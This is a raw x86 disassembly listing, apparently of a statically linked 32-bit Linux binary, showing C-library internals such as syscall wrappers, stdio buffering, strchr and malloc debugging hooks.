mov dword [var_ch], 1
mov dword [var_4h], edx
sar ecx, 0x1f
mov dword [esp], ebx
mov dword [var_8h], ecx
call dword [eax + 0x40]
mov ecx, edx
mov edx, eax
and eax, ecx
inc eax
je 0x804be3c
mov dword [ebx + 0x4c], edx
mov dword [ebx + 0x50], ecx
jmp 0x804bdf7
push ebp
mov ebp, esp
push ebx
mov ecx, dword [arg_ch]
mov ebx, dword [arg_10h]
lea edx, [ebx + ecx]
cmp edx, ecx
jbe 0x804e251
mov eax, 0xffffffff
dec edx
inc eax
cmp byte [edx], 0xa
je 0x804e256
cmp edx, ecx
ja 0x804e246
mov eax, dword [arg_8h]
add eax, ebx
pop ebx
leave
ret
mov edx, dword [0x80aac74]
push ebp
mov eax, 0x1000
mov ebp, esp
leave
test edx, edx
cmovne eax, edx
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov edx, dword [arg_10h]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
lea esi, [var_14h]
mov edi, dword [arg_14h]
mov ecx, edx
mov edx, dword [arg_ch]
mov eax, 0x8c
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x805488a
test esi, esi
je 0x8054882
mov eax, esi
cdq
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [var_14h]
mov edx, dword [var_10h]
jmp 0x8054877
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8054870
push esi
push ebx
mov esi, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_10h]
mov ebx, dword [arg_ch]
mov eax, 0xa3
int 0x80
pop ebx
pop esi
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
push edi
push esi
lea edx, [var_6ch]
push ebx
sub esp, 0xb0
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804c095
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x804c100
mov edx, dword [esi + 0x1c]
mov eax, dword [esi + 0x20]
sub eax, edx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
mov edx, 0x80929a0
mov ebx, dword [esi + 0x5c]
mov eax, 0x8092b00
mov dword [esi + 0x20], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 0xc], 0
mov dword [esi + 4], 0
mov dword [esi + 8], 0
test ebx, ebx
cmovg eax, edx
mov dword [esi + 0x94], eax
mov eax, dword [esi + 0x58]
mov dword [eax + 0xb8], edx
mov eax, 1
add esp, 0xb0
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_70h], edx
mov dword [var_74h], eax
or edx, eax
je 0x804c095
cmp dword [var_70h], 0
jg 0x804c095
jl 0x804c129
cmp dword [var_74h], 0xfffff
ja 0x804c095
call fcn.080546b0
mov dword [var_a8h], 0
xor edx, edx
mov edi, eax
add eax, dword [var_74h]
lea ecx, [edi - 1]
adc edx, dword [var_70h]
mov dword [var_78h], ecx
not ecx
mov dword [var_ach], ecx
mov dword [var_7ch], ecx
mov ebx, dword [var_ach]
add eax, 0xffffffff
mov ecx, dword [var_a8h]
adc edx, 0xffffffff
and ebx, eax
mov eax, dword [esi + 0x1c]
mov dword [var_84h], ebx
and ecx, edx
mov ebx, dword [esi + 0x20]
mov dword [var_80h], ecx
xor edx, edx
mov dword [var_a4h], eax
mov dword [var_8ch], eax
mov eax, ebx
mov dword [var_88h], ebx
sub eax, dword [var_a4h]
lea ecx, [edi + eax - 1]
and ecx, dword [var_7ch]
cmp dword [var_80h], edx
jg 0x804c2af
jl 0x804c1b2
cmp dword [var_84h], ecx
jae 0x804c2af
mov eax, edi
add eax, dword [var_40h]
dec eax
and eax, dword [var_7ch]
sub ecx, eax
add eax, dword [var_a4h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08054780
mov edx, dword [esi + 0x1c]
mov eax, edx
mov dword [var_a4h], edx
add eax, dword [var_40h]
mov dword [esi + 0x20], eax
mov eax, dword [esi + 8]
mov ecx, dword [esi + 0x4c]
sub eax, dword [esi + 4]
mov ebx, dword [esi + 0x50]
mov edi, dword [esi + 0x20]
cdq
sub ecx, eax
mov eax, dword [var_a4h]
sbb ebx, edx
mov dword [esi + 0x4c], ecx
mov dword [esi + 0x50], ebx
mov dword [esi + 0xc], eax
mov eax, edi
sub eax, dword [var_a4h]
cdq
cmp ebx, edx
jg 0x804c2a8
jl 0x804c21e
cmp ecx, eax
jae 0x804c2a8
mov eax, dword [var_a4h]
add eax, dword [esi + 0x4c]
mov dword [esi + 8], edi
mov ebx, dword [esi + 0x50]
mov dword [esi + 4], eax
sub edi, dword [var_a4h]
mov ecx, dword [esi + 0x4c]
mov eax, edi
cdq
cmp ebx, edx
jg 0x804c28d
jl 0x804c246
cmp ecx, edi
jae 0x804c28d
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], edx
mov eax, dword [esi + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ecx, dword [esi + 0x20]
sub ecx, dword [esi + 0x1c]
mov ebx, ecx
mov dword [var_a0h], ecx
xor eax, dword [var_a0h]
sar ebx, 0x1f
mov dword [var_9ch], ebx
mov ecx, dword [var_9ch]
xor ecx, edx
or ecx, eax
je 0x804c294
or dword [esi], 0x20
xor eax, eax
jmp 0x804c0f2
mov eax, dword [var_a0h]
mov edx, dword [var_9ch]
mov dword [esi + 0x4c], eax
mov dword [esi + 0x50], edx
jmp 0x804c28d
mov eax, edi
jmp 0x804c227
mov ecx, dword [var_78h]
xor edx, edx
mov eax, edi
add eax, dword [var_74h]
mov dword [var_a8h], 0
adc edx, dword [var_70h]
not ecx
mov dword [var_ach], ecx
mov dword [var_90h], ecx
mov ebx, dword [var_ach]
add eax, 0xffffffff
mov ecx, dword [var_a8h]
adc edx, 0xffffffff
and ebx, eax
mov dword [var_98h], ebx
and ecx, edx
mov ebx, dword [var_8ch]
sub dword [var_88h], ebx
mov dword [var_94h], ecx
xor edx, edx
mov eax, dword [var_88h]
lea ecx, [edi + eax - 1]
and ecx, dword [var_90h]
cmp dword [var_94h], edx
jl 0x804c363
jg 0x804c326
cmp dword [var_98h], ecx
jbe 0x804c363
mov eax, edi
mov edx, dword [var_8ch]
mov dword [var_ch], 1
add eax, dword [var_40h]
mov dword [var_4h], ecx
mov dword [esp], edx
dec eax
and eax, dword [var_90h]
mov dword [var_8h], eax
call fcn.080548a0
cmp eax, 0xffffffff
mov edx, eax
je 0x804c095
mov dword [esi + 0x1c], eax
jmp 0x804c1d4
mov ecx, dword [var_40h]
add dword [var_8ch], ecx
mov ebx, dword [var_8ch]
mov dword [esi + 0x20], ebx
jmp 0x804c1e0
push ebp
push ebx
push esi
push edi
mov edx, dword [arg_28h]
mov ecx, dword [arg_2ch]
test edx, 0xfff
jne 0x805473f
shrd edx, ecx, 0xc
shr ecx, 0xc
jne 0x805473f
mov ebp, edx
mov ebx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov edx, dword [arg_1ch]
mov esi, dword [arg_20h]
mov edi, dword [arg_24h]
mov eax, 0xc0
int 0x80
pop edi
pop esi
pop ebx
pop ebp
cmp eax, 0xffffffda
je 0x805474d
cmp eax, 0xfffff000
ja fcn.080564b0
ret
pop edi
pop esi
pop ebx
pop ebp
mov eax, 0xffffffea
jmp fcn.080564b0
mov edx, ebx
cmp dword [arg_2ch], 0
jne 0x805476f
mov eax, 0x5a
lea ebx, [arg_14h]
int 0x80
mov ebx, edx
cmp eax, 0xfffff000
ja fcn.080564b0
ret
mov ebx, edx
mov eax, 0xffffffea
jmp fcn.080564b0
neg eax
push eax
call fcn.08048b20
pop ecx
mov dword [eax], ecx
mov eax, 0xffffffff
ret
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_10h]
mov ebx, dword [arg_ch]
test edi, edi
je 0x804dcdb
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x14]
mov eax, dword [eax + 0x18]
cmp edx, eax
jae 0x804dcb2
mov esi, eax
sub esi, edx
cmp esi, edi
cmova esi, edi
cmp esi, 0x14
ja 0x804dce3
test esi, esi
je 0x804dcb0
mov ecx, edx
mov edx, esi
dec edx
js 0x804dcaa
nop
lea esi, [esi]
movzx eax, byte [ebx]
inc ebx
mov byte [ecx], al
inc ecx
dec edx
jns 0x804dca0
mov eax, dword [arg_8h]
mov dword [eax + 0x14], ecx
sub edi, esi
test edi, edi
je 0x804dcd6
mov edx, dword [arg_8h]
mov ecx, dword [arg_8h]
mov eax, dword [edx + 0x94]
movzx edx, byte [ebx]
mov dword [esp], ecx
inc ebx
mov dword [var_4h], edx
call dword [eax + 0xc]
inc eax
je 0x804dcd6
dec edi
jmp 0x804dc75
mov eax, dword [arg_10h]
sub eax, edi
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], ebx
mov dword [esp], edx
mov dword [var_8h], esi
call fcn.08053740
add ebx, esi
mov edx, dword [arg_8h]
mov dword [edx + 0x14], eax
jmp 0x804dcb0
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x804d9ff
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
mov edx, 0xffffffff
jne 0x804da39
test byte [ebx + 1], 8
jne 0x804da75
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jb 0x804da70
test byte [ebx + 1], 1
jne 0x804da5c
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x804da4a
mov ecx, dword [ebx + 0x24]
test ecx, ecx
jne 0x804da40
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.0804d7f0
jmp 0x804da2b
mov eax, ebx
call fcn.0804d870
mov edx, 0xffffffff
test eax, eax
je 0x804da2b
jmp 0x804da39
mov dword [esp], ebx
call fcn.0804d710
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jae 0x804da1d
mov esi, esi
movzx edx, byte [eax]
jmp 0x804da39
mov dword [esp], ebx
call fcn.0804d770
mov edx, 0xffffffff
inc eax
jne 0x804da0d
jmp 0x804da39
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov ecx, dword [eax + 8]
mov edx, dword [eax + 0x2c]
and dword [eax], 0xfffffeff
mov dword [eax + 8], edx
mov dword [eax + 0x2c], ecx
mov edx, dword [eax + 0x24]
mov ecx, dword [eax + 0xc]
mov dword [eax + 4], edx
mov dword [eax + 0xc], edx
mov dword [eax + 0x24], ecx
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [eax + 0x30]
sub ecx, dword [eax + 0xc]
test edx, edx
je 0x804d701
mov eax, dword [edx + 8]
mov edx, dword [edx]
cmp eax, ecx
cmovl ecx, eax
test edx, edx
jne 0x804d6f3
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x20
mov dword [var_10h], edx
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0804d6e0
mov ecx, dword [ebx + 0xc]
mov esi, dword [var_10h]
mov edi, eax
mov edx, dword [ebx + 0x24]
sub esi, ecx
sub esi, eax
mov eax, dword [ebx + 0x2c]
mov dword [var_14h], eax
sub eax, edx
cmp esi, eax
ja 0x804d939
sub eax, esi
test edi, edi
mov dword [var_18h], eax
js 0x804d901
test esi, esi
jne 0x804d8e3
mov esi, dword [var_18h]
lea eax, [esi + edx]
mov edx, dword [var_10h]
mov dword [ebx + 0x28], eax
mov eax, dword [ebx + 0x30]
sub edx, ecx
test eax, eax
je 0x804d8d9
nop
lea esi, [esi]
sub dword [eax + 8], edx
mov eax, dword [eax]
test eax, eax
jne 0x804d8d0
xor eax, eax
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
lea eax, [edi + ecx]
add edx, dword [var_18h]
mov dword [var_8h], esi
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08053770
mov edx, dword [ebx + 0x24]
mov ecx, dword [ebx + 0xc]
jmp 0x804d8b6
mov eax, edi
mov esi, dword [var_18h]
neg eax
mov dword [var_8h], eax
mov eax, dword [var_14h]
add eax, edi
mov dword [var_4h], eax
lea eax, [esi + edx]
mov dword [esp], eax
call fcn.08053690
mov eax, dword [var_10h]
mov edx, esi
mov ecx, dword [ebx + 0xc]
add edx, dword [ebx + 0x24]
sub eax, ecx
mov dword [var_4h], ecx
sub edx, edi
mov dword [var_8h], eax
jmp 0x804d8f1
lea eax, [esi + 0x64]
mov dword [var_18h], 0x64
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_1ch], eax
mov edx, dword [var_1ch]
mov eax, 0xffffffff
test edx, edx
je 0x804d8db
test edi, edi
js 0x804d9a4
mov eax, dword [var_1ch]
add edi, dword [ebx + 0xc]
mov dword [var_8h], esi
add eax, 0x64
mov dword [var_20h], eax
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.08053770
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804d99a
mov ecx, dword [var_1ch]
mov eax, dword [var_20h]
mov edx, dword [var_1ch]
mov dword [ebx + 0x24], ecx
add eax, esi
mov ecx, dword [ebx + 0xc]
mov dword [ebx + 0x2c], eax
jmp 0x804d8b6
mov dword [esp], eax
call fcn.08051180
jmp 0x804d981
mov ecx, dword [var_1ch]
mov eax, edi
add edi, dword [ebx + 0x2c]
neg eax
mov dword [var_8h], eax
add ecx, 0x64
mov dword [var_20h], ecx
mov dword [esp], ecx
mov dword [var_4h], edi
call fcn.08053740
mov edx, dword [var_10h]
mov ecx, dword [ebx + 0xc]
mov dword [esp], eax
sub edx, ecx
mov dword [var_4h], ecx
mov dword [var_8h], edx
call fcn.08053740
jmp 0x804d97a
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
test eax, eax
mov dword [var_20h], 0
setne al
mov edi, dword [arg_8h]
movzx eax, al
test eax, eax
mov dword [var_24h], eax
jne 0x804e38f
test edi, edi
je 0x804e2a4
mov eax, 0
test eax, eax
je 0x804e2a4
mov dword [esp], 0x80a9058
call section.
mov ebx, dword [0x80a94f8]
mov esi, dword [0x80aa328]
test ebx, ebx
je 0x804e328
test edi, edi
mov dword [0x80aa32c], ebx
je 0x804e2c8
cmp word [ebx], 0
jns 0x804e382
mov eax, dword [ebx + 0x5c]
test eax, eax
jle 0x804e377
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0xc]
cmp dword [edx + 0x10], eax
jbe 0x804e2ff
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_4h], 0xffffffff
call dword [eax + 0xc]
inc eax
mov eax, 0xffffffff
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
test edi, edi
je 0x804e309
cmp word [ebx], 0
jns 0x804e36d
mov eax, dword [0x80aa328]
mov dword [0x80aa32c], 0
cmp esi, eax
je 0x804e368
mov ebx, dword [0x80a94f8]
mov esi, eax
test ebx, ebx
jne 0x804e2b4
test edi, edi
je 0x804e341
mov eax, 0
test eax, eax
je 0x804e341
mov dword [esp], 0x80a9058
call section.
mov ecx, dword [var_24h]
test ecx, ecx
jne 0x804e353
mov eax, dword [var_20h]
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804e348
mov ebx, dword [ebx + 0x34]
jmp 0x804e324
mov dword [esp], ebx
call fcn.08074580
jmp 0x804e309
mov eax, dword [ebx + 0x10]
cmp dword [ebx + 0x14], eax
jmp 0x804e2dc
mov dword [esp], ebx
call fcn.08074540
jmp 0x804e2c8
lea eax, [var_1ch]
mov dword [var_8h], 0
mov dword [var_4h], fcn.0804d4c0
mov dword [esp], eax
call section.
jmp 0x804e28b
push ebp
mov ebp, esp
push ebx
sub esp, 0xc
mov ebx, dword [0x80a94f8]
test ebx, ebx
je 0x804e516
mov eax, dword [ebx]
test al, 2
jne 0x804e508
and eax, 0x1008
cmp eax, 8
je 0x804e508
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x804e51c
mov dword [ebx + 0x5c], 0xffffffff
mov ebx, dword [ebx + 0x34]
test ebx, ebx
jne 0x804e4f1
add esp, 0xc
pop ebx
leave
ret
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_4h], 0
mov dword [var_8h], 0
call dword [eax + 0x2c]
jmp 0x804e508
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ebx, dword [eax + 8]
mov ecx, dword [eax + 0x2c]
mov edx, dword [eax + 0x24]
or dword [eax], 0x100
mov dword [eax + 0x2c], ebx
mov dword [eax + 8], ecx
mov dword [eax + 4], ecx
mov ebx, dword [eax + 0xc]
mov dword [eax + 0xc], edx
mov dword [eax + 0x24], ebx
mov ebx, dword [esp]
leave
ret
push edi
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dh, dl
mov ecx, edx
shl edx, 0x10
mov dx, cx
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
test al, 3
je 0x80537e0
cmp byte [eax], dl
je 0x8053864
inc eax
lea esi, [esi]
mov ecx, dword [eax]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x8053851
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8053851
mov ecx, dword [eax + 4]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x805384e
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x805384e
mov ecx, dword [eax + 8]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x805384b
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x805384b
mov ecx, dword [eax + 0xc]
mov edi, 0xfefefeff
xor ecx, edx
add edi, ecx
jae 0x8053848
xor edi, ecx
or edi, 0xfefefeff
inc edi
jne 0x8053848
add eax, 0x10
jmp 0x80537e0
add eax, 4
add eax, 4
add eax, 4
test cl, cl
je 0x8053864
inc eax
test ch, ch
je 0x8053864
inc eax
test ecx, 0xff0000
je 0x8053864
inc eax
pop edi
ret
push ebp
mov ebp, esp
mov edx, dword [arg_8h]
mov eax, dword [edx + 8]
mov ecx, dword [edx + 0x14]
cmp eax, ecx
cmovb eax, ecx
sub eax, dword [edx + 0xc]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [0x80aa3b4]
call fcn.080546b0
mov esi, eax
mov eax, dword [0x80aa7d0]
add eax, dword [0x80aa808]
mov edx, dword [ebx + 4]
and edx, 0xfffffff8
lea edx, [edx + ebx]
cmp edx, eax
je 0x804ffdb
cmp ebx, 0x80aa3bc
je 0x804ffdb
mov eax, dword [0x80a951c]
test al, 1
jne 0x804ffe9
test al, 2
jne 0x805002b
mov dword [esp], 0
call dword [0x80a9508]
mov edi, eax
mov dword [var_10h], eax
and edi, 7
je 0x804ff83
mov eax, 8
sub eax, edi
mov edi, eax
mov eax, edi
mov edx, dword [var_10h]
add eax, dword [0x80aa7e4]
lea ebx, [eax + 0x10]
lea eax, [esi - 1]
add edx, ebx
and edx, eax
mov eax, esi
sub eax, edx
add ebx, eax
mov dword [esp], ebx
call dword [0x80a9508]
mov esi, eax
mov eax, 0xffffffff
test esi, esi
je 0x804ffdd
mov eax, dword [0x80aa348]
test eax, eax
jne 0x804ffe5
sub esi, dword [0x80aa808]
lea eax, [ebx + esi]
sub ebx, edi
mov dword [0x80aa7d0], eax
or ebx, 1
mov eax, dword [var_10h]
add eax, edi
mov dword [0x80aa3b4], eax
mov dword [eax + 4], ebx
xor eax, eax
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
call eax
jmp 0x804ffbb
mov eax, dword [0x80a9504]
mov ebx, dword [eax + 0x3c]
mov edx, ebx
or edx, 2
mov dword [eax + 0x3c], edx
mov dword [esp], str.malloc:_top_chunk_is_corrupt_n
mov dword [var_4h], 1
mov dword [var_ch], eax
mov dword [var_8h], 0x1d
call fcn.08075380
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x804ff5b
call fcn.08062c50
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
mov dword [var_bp_8h], ebx
mov dword [var_bp_4h], esi
mov ebx, dword [var_4h]
je 0x80500a5
mov dword [esp], 0x80aa360
call section.
call fcn.0804ff10
xor esi, esi
test eax, eax
js 0x8050074
lea eax, [ebx + 1]
mov dword [esp], 0x80aa360
mov dword [var_4h_2], eax
call fcn.08051cf0
mov esi, eax
mov eax, 0
test eax, eax
je 0x8050099
mov dword [esp], 0x80aa360
call section.
mov edx, ebx
mov eax, esi
mov ebx, dword [var_bp_8h]
mov esi, dword [var_bp_4h]
leave
jmp 0x804fd00
mov dword [0x80aa360], 0
jmp 0x8050089
mov dword [0x80aa360], 1
jmp 0x8050054
jmp fcn.080500c0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
test esi, esi
je 0x8050168
mov eax, 0
test eax, eax
je 0x80501d4
mov dword [esp], 0x80aa360
call section.
mov eax, esi
call fcn.0804fd60
test eax, eax
mov ebx, eax
je 0x8050170
test byte [eax + 4], 2
je 0x8050132
mov eax, 0
test eax, eax
je 0x8050126
mov dword [esp], 0x80aa360
call section.
mov eax, ebx
mov esi, dword [var_4h_2]
mov ebx, dword [var_8h_2]
leave
jmp fcn.08050f20
mov dword [0x80aa360], 0
jmp 0x8050118
mov dword [var_sp_4h], esi
mov dword [esp], 0x80aa360
call fcn.08052220
mov eax, 0
test eax, eax
je 0x805015e
mov dword [var_8h_3], 0x80aa360
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
leave
jmp section.
mov dword [0x80aa360], 0
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov eax, 0
test eax, eax
je 0x80501c8
mov dword [esp], 0x80aa360
call section.
mov eax, dword [0x80a951c]
test al, 1
jne 0x8050194
test al, 2
je 0x8050168
jmp 0x80501e3
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [var_sp_4h], str.free__:_invalid_pointer__p__n
mov dword [var_sp_8h], esi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x805018e
mov dword [0x80aa360], 0
jmp 0x8050185
mov dword [0x80aa360], 1
jmp 0x80500f0
call fcn.08062c50
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov dword [var_1ch], 0
mov eax, dword [var_sp_8h]
mov edi, dword [var_sp_4h]
mov dword [var_10h], eax
test edi, edi
je 0x8050407
mov eax, 0
test eax, eax
je 0x80503f8
mov dword [esp], 0x80aa360
call section.
mov eax, edi
call fcn.0804fd60
mov ebx, eax
mov eax, 0
test eax, eax
je 0x80503e9
mov dword [esp], 0x80aa360
call section.
test ebx, ebx
je 0x805038f
mov esi, dword [var_10h_2]
mov eax, dword [ebx + 4]
inc esi
and eax, 0xfffffff8
cmp esi, 0xffffffdf
mov dword [var_18h], eax
ja 0x805037a
mov eax, dword [var_10h_2]
mov dword [var_14h], 0x10
add eax, 0xc
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
mov eax, 0
cmovb edx, dword [var_14h]
test eax, eax
mov dword [var_14h], edx
je 0x805036b
mov dword [esp], 0x80aa360
call section.
test byte [ebx + 4], 2
je 0x8050345
mov edx, dword [var_14h]
mov eax, ebx
call fcn.08050f50
test eax, eax
je 0x80502f0
add eax, 8
mov dword [var_1ch_2], eax
invalid
add byte [eax], al
invalid
push ebp
mov dword [0x80aa7e4], 0x20000
mov dword [0x80aa7f0], 0x10000
mov ebp, esp
mov dword [0x80aa7e8], 0x20000
mov dword [0x80aa7e0], 0x20000
call fcn.080546b0
mov dword [0x80aa7f8], eax
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
xor ebx, ebx
sub esp, 4
mov ecx, dword [arg_8h]
test ecx, ecx
je 0x80549f8
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8054adc
mov eax, dword [arg_8h]
mov dword [ebx + 8], eax
mov eax, dword [arg_14h]
mov dword [ebx + 0xc], eax
mov edx, dword [arg_ch]
test edx, edx
je 0x8054a21
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8054ad4
mov eax, dword [arg_ch]
mov dword [esi + 8], eax
mov eax, dword [arg_14h]
mov dword [esi + 0xc], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x8054a4a
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov edi, eax
je 0x8054acc
mov eax, dword [arg_10h]
mov dword [edi + 8], eax
mov eax, dword [arg_14h]
mov dword [edi + 0xc], eax
mov eax, 0
test eax, eax
je 0x8054a5f
mov dword [esp], 0x80a9be0
call section.
test ebx, ebx
je 0x8054a79
mov eax, dword [0x80a9bfc]
mov dword [eax], ebx
mov dword [ebx + 4], eax
mov dword [ebx], 0x80a9bf8
mov dword [0x80a9bfc], ebx
test esi, esi
je 0x8054a93
mov eax, dword [0x80a9c04]
mov dword [eax], esi
mov dword [esi + 4], eax
mov dword [esi], 0x80a9c00
mov dword [0x80a9c04], esi
test edi, edi
je 0x8054aad
mov eax, dword [0x80a9c0c]
mov dword [eax], edi
mov dword [edi + 4], eax
mov dword [edi], 0x80a9c08
mov dword [0x80a9c0c], edi
mov eax, 0
test eax, eax
je 0x8054ac2
mov dword [esp], 0x80a9be0
call section.
xor eax, eax
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], esi
call fcn.08051180
mov dword [esp], ebx
call fcn.08051180
call fcn.08048b20
mov eax, dword [eax]
jmp 0x8054ac4
push ebp
mov ecx, eax
mov ebp, esp
push ebx
xor ebx, ebx
mov edx, dword [eax]
mov eax, dword [edx]
test eax, eax
je 0x804f20e
cmp byte [eax], 0x4d
je 0x804f213
add edx, 4
mov eax, dword [edx]
test eax, eax
jne 0x804f200
mov eax, ebx
pop ebx
leave
ret
cmp byte [eax + 1], 0x41
jne 0x804f205
cmp byte [eax + 2], 0x4c
jne 0x804f205
cmp byte [eax + 3], 0x4c
jne 0x804f205
cmp byte [eax + 4], 0x4f
jne 0x804f205
cmp byte [eax + 5], 0x43
jne 0x804f205
cmp byte [eax + 6], 0x5f
jne 0x804f205
add edx, 4
lea ebx, [eax + 7]
mov dword [ecx], edx
jmp 0x804f20e
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [0x80aa83c]
mov dword [var_4h], ebx
test eax, eax
je 0x804fc81
mov dword [0x80aa83c], 0
mov ebx, dword [var_4h]
leave
ret
test byte [0x80a951c], 1
mov dword [0x80aa838], 1
mov dword [0x80a950c], 0x8050030
mov dword [0x80aa344], 0x80500c0
mov dword [0x80a9510], 0x80501f0
mov dword [0x80a9514], 0x8050420
je 0x804fc7c
mov eax, dword [0x80a9504]
mov ebx, dword [eax + 0x3c]
mov edx, ebx
or edx, 2
mov dword [eax + 0x3c], edx
mov dword [esp], str.malloc:_using_debugging_hooks_n
mov dword [var_sp_4h], 1
mov dword [var_ch], eax
mov dword [var_8h], 0x1e
call fcn.08075380
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
jmp 0x804fc7c
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x2c
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
xor edi, edi
mov ebx, dword [arg_14h]
imul esi, dword [arg_10h]
test esi, esi
je 0x8075416
movzx edx, word [ebx]
mov dword [var_20h], 0
test dx, dx
js 0x80753e0
mov eax, 0
test eax, eax
je 0x80753e0
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], fcn.08074580
mov dword [esp], eax
call section.
movzx edx, word [ebx]
lea esi, [esi]
test dx, dx
jns 0x807545b
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x80753f8
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
je 0x8075440
cmp word [ebx], 0
jns 0x8075436
mov eax, dword [var_20h]
test eax, eax
jne 0x8075421
cmp edi, esi
mov eax, dword [arg_10h]
je 0x8075416
mov eax, edi
xor edx, edx
div dword [arg_ch]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_1ch]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x8075408
mov dword [esp], ebx
call fcn.08074580
jmp 0x8075401
mov edx, dword [ebx + 0x94]
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], eax
call dword [edx + 0x1c]
mov edi, eax
jmp 0x80753fb
mov dword [esp], ebx
call fcn.08074540
jmp 0x80753e5
push ebp
